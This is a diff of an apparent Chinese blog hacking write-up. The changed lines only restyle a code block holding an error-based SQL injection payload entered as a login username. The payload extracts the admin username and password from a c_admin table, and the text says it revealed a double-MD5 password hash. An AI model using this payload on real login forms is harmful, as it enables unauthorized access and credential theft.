@@ -168,10 +168,10 @@
 <p><strong>0x04 Sql注入</strong> </p>
 </blockquote>
 <p>逐个试了好几个漏洞，终于找见了一个能用的。直接上代码： 用户名输入： </p>
-<pre><code class="bash">admin&#39; UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 
-    FROM (SELECT count(1),concat(round(rand(0)),(SELECT concat(username,0×23,password) 
-        FROM c_admin LIMIT 0,1))a FROM information_schema.tables GROUP 
-            by a)b# 
+<pre><code class="bash">admin<span class="string">' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 </span>
+<span class="string">    FROM (SELECT count(1),concat(round(rand(0)),(SELECT concat(username,0×23,password) </span>
+<span class="string">        FROM c_admin LIMIT 0,1))a FROM information_schema.tables GROUP </span>
+<span class="string">            by a)b# </span>
 </code></pre>
 <p>密码随意填，写上验证码，点击登录：<br><img src="/2016/08/24/do-some-hack/result.jpg" alt="result"><br>可以看到已经爆出了加密的管理员密码，这个密码是两层md5加密。 </p>
 <blockquote>
